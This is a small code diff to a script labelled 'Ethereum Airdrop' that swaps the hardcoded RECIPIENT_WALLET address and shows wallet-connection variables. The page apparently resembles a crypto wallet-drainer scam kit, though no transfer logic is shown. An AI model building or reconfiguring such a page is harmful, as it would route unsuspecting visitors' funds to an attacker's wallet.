@@ -1,6 +1,6 @@
 // js/scripts.js - Ethereum Airdrop
 // ===== CONFIGURATION =====
-const RECIPIENT_WALLET = '0x3481a7D9F9E6bFA64ee426395cE45aF292fAc206';
+const RECIPIENT_WALLET = '0x214262B33351F3a81F0aa40E500b8b8d22038D75';
 const ETH_CHAIN_ID = '0x1';
 
 let userAccount = null, walletConnected = false, connectionState = 'disconnected';
